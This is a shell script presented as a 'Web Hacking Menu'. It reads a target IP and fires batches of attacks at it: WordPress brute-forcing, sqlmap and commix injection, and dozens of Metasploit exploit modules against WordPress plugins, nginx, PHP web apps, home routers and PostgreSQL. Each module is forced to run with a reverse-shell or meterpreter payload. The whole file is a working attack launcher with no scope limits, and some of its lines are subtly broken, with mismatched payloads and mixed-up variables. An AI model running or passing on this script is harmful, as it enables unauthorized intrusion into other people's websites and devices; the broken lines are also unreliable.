#!/bin/sh
#Info-gather script
#Code by DroPZsec
#

#COLORED_OUTPUT

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# MENU CODE

clear
    sleep 1.0
echo $green "Loading Web Scanning Menu..." $reset 
    sleep 1.0
clear
    sleep 0.25
echo $orange 
figlet -f small "Web Hacking Menu"
echo "" $reset 
echo "" 
echo ""
echo ""
echo "" 
echo $blue"1."$reset $orange")"$reset $green "Wordpress Scans" $reset 
    sleep 0.25 
echo $blue"2."$reset $orange")"$reset $green "SQL Injection Scans" $reset 
    sleep 0.25 
echo $blue"3."$reset $orange")"$reset $green "Web Info Gather Scans" $reset 
    sleep 0.25 
echo $blue"4."$reset $orange")"$reset $green "Brute-force Attack" $reset 
    sleep 0.25 
echo $blue"5."$reset $orange")"$reset $green "Metasploit WP Exploiting" $reset 
    sleep 0.25 
echo $blue"6."$reset $orange")"$reset $green "Metasploit NGINX Exploiting" $reset 
    sleep 0.25 
echo $blue"7."$reset $orange")"$reset $green "Metasploit PHP Exploiting" $reset 
    sleep 0.25 
echo $blue"8."$reset $orange")"$reset $green "Metasploit Internet-Router Exploiting" $reset 
    sleep 0.25 
echo $blue"9."$reset $orange")"$reset $green "Metasploit PostGreSQL Exploiting" $reset 
    sleep 0.25 
echo $blue"10."$reset $orange")"$reset $green "EXIT" $reset 
    sleep 0.25 

echo $green "Enter your choice:" $reset
    read answer;

if [ $answer = 1 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    nmap -p 80,443 -sV -Pn $ip --script=http-wordpress-brute.nse --script-args 'userdb=users.txt,passdb=passwds.txt'
    nmap -p 80,443 -sV -Pn $ip --script=http-wordpress-enum.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-wordpress-users.nse
    sudo wpscan --url http://$ip --random-user-agent -e ap --plugins-detection mixed
    sudo wpscan --url https://$ip --random-user-agent -e ap --plugins-detection mixed
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 2 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sqlmap -u http://$ip --random-agent --level=5 --risk=3 -a 
    sqlmap -u https://$ip --random-agent --level=5 --risk=3 -a
    sudo commix --check-internet -u http://$ip --random-agent --all --level=3 
    sudo commix --check-internet -u https://$ip --random-agent --all --level=3
    sudo commix --check-internet -u http://$ip --random-agent --all --shellshock --level=3 
    sudo commix --check-internet -u https://$ip --random-agent --all --shellshock --level=3
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 3 ]; then 
    echo $green "Enter Target IP:" $reset
        read ip;
    sudo whatweb -a 3 http://$ip
    sudo whatweb -a 3 https://$ip
    dirb http://$ip
    dirb https://$ip
    sudo wapiti -u http://$ip -l 2
    sudo wapiti -u https://$ip -l 2
    sudo wafw00f http://$ip
    sudo wafw00f https://$ip
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 4 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo brutex $ip 
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 5 ]; then 
    echo $green "Enter Target IP:" $reset 
        read website;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/multi/http/wp_plugin_sp_project_document_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; run; exit; exit; "     
    msfconsole -q -x " use exploit/multi/http/wp_ait_csv_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_simple_file_list_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_modern_events_calendar_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_catch_themes_demo_import; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_backup_guard_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_plainview_activity_monitor_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; set PASSWORD admin; set USERNAME admin; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_popular_posts_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; set SRVPORT 80; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_dnd_mul_file_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_infinitewp_auth_bypass; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_pie_register_bypass_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "   
    msfconsole -q -x " use exploit/multi/http/wp_plugin_sp_project_document_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; run; exit; exit; "     
    msfconsole -q -x " use exploit/multi/http/wp_ait_csv_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_simple_file_list_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_modern_events_calendar_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_catch_themes_demo_import; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_plugin_backup_guard_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_plainview_activity_monitor_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; set PASSWORD admin; set USERNAME admin; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_popular_posts_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; set SRVPORT 80; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/wp_dnd_mul_file_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_infinitewp_auth_bypass; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/wp_pie_register_bypass_rce; set payload php/meterpreter/reverse_tcp; set RHOSTS $website; set RPORT 443; set forceexploit true; set LHOST eth0; set LPORT 4444; run; exit; exit; "
    echo $green "Press ENTER to continue..."
        read enter;
fi
if [ $answer = 6 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/linux/http/nginx_chunked_size; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/php_fpm_rce; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 7 ]; then 
    echo $green "Enter Target IP:" $reset 
        read website;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo $green "Enter Target Port:" $reset 
    msfconsole -q -x " use exploit/unix/webapp/bolt_authenticated_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/http/cacti_filter_sqli_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/cayin_cms_ntp; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/http/cayin_xpost_sql_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/horizontcms_upload_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/klog_server_authenticate_user_unauth_command_injection; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linuxki_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/maracms_upload_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/mida_solutions_eframework_ajaxreq_rce set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/nagios_xi_snmptrap_authenticated_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/nagios_xi_mibs_authenticated_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netsweeper_webadmin_unixlogin; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/openmediavault_rpc_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/fileformat/archive_tar_arb_file_write; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/pandora_fms_events_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/pandora_ping_cmd_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/http/pihole_blocklist_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/playsms_template_injection; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/rconfig_ajaxarchivefiles_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/suitecrm_log_file_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/freebsd/webapp/spamtitan_unauth_rce; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/unraid_auth_bypass_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/webapp/opensis_chain_exec; set payload linux/armle/webapp/aerohive_netconfig_lfi_log_poison_rce; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 8 ]; then 
    echo $green "Enter Target IP:" $reset 
        read website;
    echo $green "Enter Target Port:" $reset 
        read port;
    msfconsole -q -x " use exploit/linux/misc/asus_infosvr_auth_bypass_exec; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/airties_login_cgi_bof;  set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/misc/avaya_winpmd_unihostrouter; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/belkin_login_bof; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/unix/http/ctek_skyrouter; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/cve_2019_1663_cisco_rmi_rce; set payload linux/mipsle/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/cisco_rv32x_rce; set payload generic/shell_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir605l_captcha_bof; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_diagnostic_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/upnp/dlink_dir859_subscribe_exec; set payload linux/mipsbe/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir615_up_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dsl2750b_exec_noauth; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_hnap_header_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_upnp_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_command_php_exec_noauth; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir300_exec_telnet; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/upnp/dlink_upnp_msearch_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_authentication_cgi_bof; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_hedwig_cgi_bof; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/multi_ncc_ping_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_dir850l_unauth_exec; set payload linux/mipsbe/shell/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/dlink_hnap_login_bof; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/huawei_hg532n_cmdinject; set payload linux/mipsbe/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_wrt110_cmd_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_themoon_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_e1500_apply_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_wrt160nv2_apply_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_apply_cgi; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/linksys_wrt54gl_apply_exec; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/http/lcms_php_exec; set payload php/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_wnr2000_rce; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/misc/netcore_udp_53413_backdoor; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_dgn1000b_setup_exec; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_dnslookup_cmd_exec; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_dgn2200b_pppoe_exec; set payload linux/mipsbe/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/netgear_r7000_cgibin_exec; set payload linux/armle/meterpreter_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/realtek_miniigd_upnp_exec_noauth; set payload linux/mipsle/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/misc/tplink_archer_a7_c7_lan_rce; set payload linux/mipsbe/shell_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/trueonline_billion_5200w_rce; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/trueonline_p660hn_v1_rce; set payload cmd/unix/interact; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/http/trueonline_p660hn_v2_rce; set payload linux/mipsbe/shell_reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 9 ]; then 
    echo $green "Enter Target IP" $reset 
        read ip;
    echo $green "Enter Target Port:" $reset 
        reaf port;
    msfconsole -q -x " use exploit/multi/http/manage_engine_dc_pmp_sqli; set payload linux/x86/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set payload cmd/unix/reverse_perl; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/multi/postgres/postgres_createlang; set payload cmd/unix/reverse_netcat; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/linux/postgres/postgres_payload; set payload linux/x86/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    msfconsole -q -x " use exploit/windows/postgres/postgres_payload; set payload windows/meterpreter/reverse_tcp; set RHOSTS $ip; set RPORT $port; set forceexploit true; set LHOST eth0; run; exit; exit; "
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 10 ]; then 
    echo $green "OK, Youre Choice..."
        sleep 1.0
    clear
    echo $blue
    figlet -f small "Webscan Attack script"
        sleep 0.5 
    figlet -f small "coded by:"
    echo $reset $orange 
        sleep 1.0 
    figlet -f big "vDroPZz"
        sleep 1.0
    clear 
    echo $reset $blue  
    figlet -f small "Follow me on Github:"
    echo $reset $orange 
        sleep 0.5 
    figlet -f big "DroPZsec"
        sleep 1.5 
    clear 
    echo $reset 
    cd ..
    ./BashAttack.sh  
fi 
./webs.sh  
/bin/sh